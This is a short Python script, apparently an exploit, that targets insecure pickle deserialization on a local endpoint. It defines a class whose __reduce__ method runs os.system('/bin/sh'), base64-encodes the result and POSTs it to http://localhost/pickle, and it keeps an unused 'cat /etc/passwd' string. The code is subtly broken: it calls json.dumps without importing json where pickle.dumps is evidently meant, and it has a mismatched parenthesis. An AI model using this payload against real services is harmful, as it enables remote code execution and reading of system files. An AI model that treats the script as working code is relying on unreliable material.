import base64
import os
import pickle
import requests
import logging
from logging.handlers import RotatingFileHandler

# Set up logging
LOG_FILENAME = '/var/log/myapp/security.log'
logging.basicConfig(filename=LOG_FILENAME, level=logging.DEBUG)
logger = logging.getLogger(__name__)
handler = RotatingFileHandler(LOG_FILENAME, maxBytes=100000, backupCount=5)
logger.addHandler(handler)

url = 'http://localhost/pickle'
shellcode = 'cat /etc/passwd'

class Exploit(object):
    def __reduce__(self):
        return (os.system, ('/bin/sh',),))

exploit = json.dumps(Exploit())
pickle_exploit = base64.b64encode(exploit.encode()).decode()

data = {'input_data': pickle_exploit}

response = requests.post(url, data=data)

print(response.text)



